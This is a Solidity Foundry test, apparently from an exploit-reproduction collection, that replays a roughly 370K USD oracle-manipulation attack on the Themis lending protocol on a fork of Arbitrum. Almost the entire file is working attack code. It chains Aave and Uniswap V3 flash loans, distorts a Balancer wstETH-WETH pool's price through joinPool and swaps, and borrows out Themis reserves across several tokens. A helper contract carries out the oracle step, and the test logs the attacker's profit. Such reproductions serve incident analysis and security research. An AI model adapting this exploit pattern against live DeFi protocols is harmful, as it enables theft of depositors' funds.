// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~370K USD$
// Attacker : https://arbiscan.io/address/0xdb73eb484e7dea3785520d750eabef50a9b9ab33
// Attack Contracts : https://arbiscan.io/address/0x05a1b877330c168451f081bfaf32d690ea964fca
// https://arbiscan.io/address/0x33f3fb58ea0f91f4bd8612d9f477420b01023f25
// Vulnerable Contract : https://arbiscan.io/address/0x75f805e2fb248462e7817f0230b36e9fae0280fc
// Attack Tx : https://arbiscan.io/tx/0xff368294ccb3cd6e7e263526b5c820b22dea2b2fd8617119ba5c3ab8417403d8

// @Analysis
// https://twitter.com/BeosinAlert/status/1673930979348717570
// Detailed attack steps: https://twitter.com/BlockSecTeam/status/1673897088617426946

interface IThemis {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;

    function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;

    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;
}

interface IGauge is IERC20 {
    function deposit(uint256 _amount, address _referrer) external;
}

interface IPool is IERC20 {
    function getPoolId() external view returns (bytes32);
}

contract ThemisTest is Test {
    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 wstETH = IERC20(0x5979D7b546E38E414F7E9822514be443A4800529);
    IERC20 DAI = IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);
    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 ARB = IERC20(0x912CE59144191C1204E64559FE8253a0e49E6548);
    IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    // wstETH - WETH Pool
    IPool BalancerPool = IPool(0x36bf227d6BaC96e2aB1EbB5492ECec69C691943f);
    IGauge BalancerGauge = IGauge(0x8F0B53F3BA19Ee31C0A73a6F6D84106340fadf5f);
    IAaveFlashloan AaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    Uni_Pair_V3 UniPool1 = Uni_Pair_V3(0x2f5e87C9312fa29aed5c179E456625D79015299c);
    Uni_Pair_V3 UniPool2 = Uni_Pair_V3(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
    IBalancerVault BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IThemis AttackedThemisContract = IThemis(0x75F805e2fB248462e7817F0230B36E9Fae0280Fc);
    IAggregator Aggregator = IAggregator(0x17df2B52f5D756420846c78c69F4fE4fF10e57A4);
    address private constant proxyAddress = 0xdE85D18ADdA9D2b9eAfa7Dbf0ceC5A89119d90F0;
    address private constant themisDAI = 0x10c73B8e7E5DC0d25a1A717f4BF9026d955382dE;
    address private constant themisUSDC = 0x349aC9f74Dcf2Bdf6a39F0Df57f5c8C9840a5367;
    address private constant themisUSDT = 0xe67F804192c92674639cE46D059823976C24E925;
    address private constant themisARB = 0x1467B18945135c6866b7f9d64729bcDAD60C9295;
    address private constant themisWBTC = 0x1762A96724ab7ae072ABD7dB7A43fFc66261669E;
    address private constant themisWETH = 0xe611e633C1E88d4f026fec5Bc1E40E8A477f41aD;
    AttackContract AContract;
    address private constant DAI_USDC = 0xd37Af656Abf91c7f548FfFC0133175b5e4d3d5e6;
    address private constant WETH_ARB = 0x92c63d0e701CAAe670C9415d91C474F686298f00;
    address private constant WBTC_WETH = 0x2f5e87C9312fa29aed5c179E456625D79015299c;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("arbitrum", 105_524_523);
        cheats.label(address(WETH), "WETH");
        cheats.label(address(AaveV3), "AaveV3");
        cheats.label(address(UniPool1), "UniPool1");
        cheats.label(address(UniPool2), "UniPool2");
    }

    function testExploit() public {
        WETH.approve(address(AaveV3), type(uint256).max);

        address[] memory assets = new address[](1);
        assets[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 22_000 * 1e18;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        AaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        uniswapV3Swap(DAI_USDC, true, DAI.balanceOf(address(this)), 39_213_280_958_319_573_512_907);
        uniswapV3Swap(WETH_ARB, false, ARB.balanceOf(address(this)), 6_123_808_957_771_478_940_080_370_857_742);
        uniswapV3Swap(WBTC_WETH, true, WBTC.balanceOf(address(this)), 21_845_559_093_545_742_410_589_827_953_560_948);
        emit log_named_decimal_uint(
            "Attacker's amount of WETH after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker's amount of USDC after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker's amount of USDT after exploit", USDT.balanceOf(address(this)), USDT.decimals()
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        UniPool1.flash(address(this), 0, 10_000 * 1e18, "");
        return true;
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        if (msg.sender == address(UniPool1)) {
            UniPool2.flash(address(this), 8000 * 1e18, 0, "");
            WETH.transfer(msg.sender, 10_000 * 1e18 + fee1);
        } else {
            WETH.approve(address(BalancerVault), type(uint256).max);
            WETH.approve(address(AttackedThemisContract), type(uint256).max);
            wstETH.approve(address(BalancerVault), type(uint256).max);
            BalancerPool.approve(address(BalancerGauge), type(uint256).max);
            BalancerGauge.approve(proxyAddress, type(uint256).max);

            Aggregator.latestAnswer();

            AttackedThemisContract.supply(address(WETH), 220e18, address(this), 0);
            AttackedThemisContract.setUserUseReserveAsCollateral(address(WETH), true);

            // emit log_uint(DAI.balanceOf(themisDAI));
            borrowTokens(address(DAI), DAI.balanceOf(themisDAI));
            borrowTokens(address(USDC), USDC.balanceOf(themisUSDC));
            borrowTokens(address(USDT), USDT.balanceOf(themisUSDT));
            borrowTokens(address(ARB), ARB.balanceOf(themisARB));
            borrowTokens(address(WBTC), WBTC.balanceOf(themisWBTC));

            WETH.withdraw(55e18);

            AContract = new AttackContract{value: 55 ether}();

            balancerSwap(address(wstETH), address(WETH), wstETH.balanceOf(address(this)));
            WETH.transfer(msg.sender, 8000 * 1e18 + fee0);
        }
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        if (msg.sender == DAI_USDC) {
            DAI.transfer(DAI_USDC, uint256(amount0Delta));
        } else if (msg.sender == WETH_ARB) {
            ARB.transfer(WETH_ARB, uint256(amount1Delta));
        } else {
            WBTC.transfer(WBTC_WETH, uint256(amount0Delta));
        }
    }

    function balancerSwap(address tokenA, address tokenB, uint256 swapAmount) public {
        IBalancerVault.SingleSwap memory single = IBalancerVault.SingleSwap({
            poolId: BalancerPool.getPoolId(),
            kind: IBalancerVault.SwapKind(0),
            assetIn: tokenA,
            assetOut: tokenB,
            amount: swapAmount,
            userData: ""
        });

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });

        BalancerVault.swap(single, funds, 0, block.timestamp);
    }

    function borrowTokens(address token, uint256 borrowAmount) internal {
        AttackedThemisContract.borrow(token, borrowAmount, 2, 0, address(this));
    }

    function uniswapV3Swap(
        address uniswapPool,
        bool zeroForOne,
        uint256 amountSpecified,
        uint160 sqrtPriceLimit
    ) internal {
        Uni_Pair_V3(uniswapPool).swap(address(this), zeroForOne, int256(amountSpecified), sqrtPriceLimit, "");
    }

    receive() external payable {}
}

contract AttackContract {
    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 wstETH = IERC20(0x5979D7b546E38E414F7E9822514be443A4800529);
    IBalancerVault BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IGauge BalancerGauge = IGauge(0x8F0B53F3BA19Ee31C0A73a6F6D84106340fadf5f);
    IPool BalancerPool = IPool(0x36bf227d6BaC96e2aB1EbB5492ECec69C691943f);
    IAggregator Aggregator = IAggregator(0x17df2B52f5D756420846c78c69F4fE4fF10e57A4);
    address private constant proxyAddress = 0xdE85D18ADdA9D2b9eAfa7Dbf0ceC5A89119d90F0;
    address private constant themisWETH = 0xe611e633C1E88d4f026fec5Bc1E40E8A477f41aD;
    address private constant themisContract = 0x2132d49157D6148dEe8753f059fAd1C1b09C477c;

    constructor() payable {
        WETH.approve(address(BalancerVault), type(uint256).max);
        BalancerPool.approve(address(BalancerGauge), type(uint256).max);
        BalancerGauge.approve(proxyAddress, type(uint256).max);
        depositWETH();

        address[] memory tokens = new address[](2);
        tokens[0] = address(wstETH);
        tokens[1] = address(WETH);
        uint256[] memory amountsIn = new uint256[](2);
        amountsIn[0] = 0;
        amountsIn[1] = 55e18;

        bytes memory data =
            hex"00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002fb474098f67c0000";

        IBalancerVault.JoinPoolRequest memory request = IBalancerVault.JoinPoolRequest({
            asset: tokens,
            maxAmountsIn: amountsIn,
            userData: data,
            fromInternalBalance: false
        });
        BalancerVault.joinPool(BalancerPool.getPoolId(), address(this), address(this), request);

        BalancerGauge.deposit(BalancerPool.balanceOf(address(this)), address(this));
        proxyCall();
        balancerSwap();
        Aggregator.latestAnswer();
        borrowWETH();
        WETH.transfer(msg.sender, WETH.balanceOf(address(this)));
    }

    function borrowWETH() internal {
        (bool success, bytes memory retData) = themisContract.call(
            abi.encodeWithSignature(
                "borrow(address,address,uint256,uint256)", address(WETH), address(this), WETH.balanceOf(themisWETH), 2
            )
        );

        require(success, "Call not successful");
    }

    function balancerSwap() internal {
        (bool success, bytes memory retData) = msg.sender.call(
            abi.encodeWithSignature(
                "balancerSwap(address,address,uint256)", address(WETH), address(wstETH), 39_725 * 1e18
            )
        );
        require(success, "Call not successful");
    }

    function proxyCall() internal {
        (bool success, bytes memory retData) = proxyAddress.call(
            abi.encodeWithSelector(bytes4(0x41d11324), address(BalancerGauge), BalancerGauge.balanceOf(address(this)))
        );
        require(success, "Call not successful");
    }

    function depositWETH() internal {
        (bool success, bytes memory retData) = address(WETH).call{value: 55 ether}(abi.encodeWithSignature("deposit()"));
        require(success, "Call not successful");
    }
}
